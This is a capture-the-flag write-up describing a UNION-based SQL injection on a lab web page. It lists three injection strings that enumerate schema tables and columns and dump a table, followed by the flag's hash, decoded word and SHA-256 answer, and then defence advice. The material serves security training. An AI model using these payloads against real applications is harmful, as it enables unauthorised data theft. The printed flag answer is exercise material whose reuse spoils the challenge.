# SQL injection

## Found on
```
<ip>/?page=searchimg
```

## How to exploit

The nmap tool informed of a possible Cross Site Request Forgeries (CSRF) vulnribility on this page.

What we found was an SQL Injection vulnribility.

Typing anything other than an id (integer) returns an SQL error. This gives an indication that the input is not sterilized before running a query.

This is very dangerous as attackers notice these things and mark inputs and fields like these as targets.  

1. To get table names:
```
3 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = database()
```

2. To get user table column names:
```
3 UNION SELECT column_name, null FROM information_schema.columns WHERE table_schema = database()
```

3. To get all data of users:
```
3 UNION SELECT title, comment FROM list_images
```

The last injection reveals this:
```
ID: 3 UNION SELECT title, comment FROM list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

With these instructions getting the flag was easy.
1. Decript the hash -> albatroz
2. Encrypt the lowercase phrase with Sh256 -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

[MD5 decryption utility](https://hashtoolkit.com/decrypt-md5-hash)

## A brief explination of the SQL attack

When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack.

The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query.

## How to protect against

* Use prepared statements or strerilize the input from the form.
* Using layered security minimizes the risk of vulnribilities being exposed.
* Using [Parameterized Queries in SQL](https://use-the-index-luke.com/sql/where-clause/bind-parameters)

## Resources:
* <https://owasp.org/www-community/attacks/SQL_Injection>
* <https://portswigger.net/web-security/sql-injection/union-attacks>
* <https://dev.mysql.com/doc/refman/8.0/en/information-schema.html>
* <https://www.softwaretestinghelp.com/sql-injection-how-to-test-application-for-sql-injection-attacks/>